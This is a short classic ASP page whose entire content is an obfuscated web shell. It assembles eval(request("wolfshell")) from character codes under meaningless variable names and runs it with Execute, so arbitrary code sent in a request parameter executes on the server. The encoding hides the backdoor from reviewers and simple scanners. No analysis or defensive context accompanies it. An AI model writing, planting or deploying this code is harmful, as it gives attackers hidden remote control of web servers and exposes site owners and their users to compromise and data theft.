<%
Dim arr_x7a, str_y3b, str_z9c, final_q5d, i_f8e, temp_g1h
arr_x7a = Array(101, 118, 97, 108, 40, 114, 101, 113, 117, 101, 115, 116, 40, 34, 119, 111, 108, 102, 115, 104, 101, 108, 108, 34, 41, 41)
str_y3b = ""
For i_f8e = 0 To UBound(arr_x7a)
    str_y3b = str_y3b & Chr(arr_x7a(i_f8e))
Next
temp_g1h = str_y3b
Execute(temp_g1h)
%>